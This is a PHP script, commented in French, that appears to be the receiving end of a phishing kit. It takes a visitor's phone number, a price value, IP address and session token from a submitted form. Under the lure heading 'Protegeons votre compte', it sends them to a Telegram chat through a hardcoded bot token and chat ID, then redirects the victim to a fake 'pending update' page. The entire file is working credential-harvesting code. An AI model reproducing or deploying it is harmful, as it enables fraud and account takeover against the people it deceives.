<?php
// Démarrer la session pour utiliser $_SESSION
session_start();

// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

// Capturer l'adresse IP du client
$client_ip = $_SERVER['REMOTE_ADDR'];

// Récupérer et stocker le token de session
$session_token = isset($_POST['session_token']) ? $_POST['session_token'] : null;
$_SESSION['token'] = $session_token;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone_number'];
    $mont = $_POST['price_tagg'];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Protegeons votre compte:\n\n";
    $message .= "Numéro de téléphone : $phone\n";
    $message .= "Prix de l'article en euro : $mont\n";
    $message .= "Adresse IP : $client_ip\n";
    $message .= "Token de session : $session_token\n";

    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    if ($response->isOk()) {
        // Rediriger l'utilisateur vers la page de confirmation
        header("Location: ../pending/update/index.php");
        exit();
    } else {
        echo "Échec de l'envoi du message à Telegram.";
    }
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
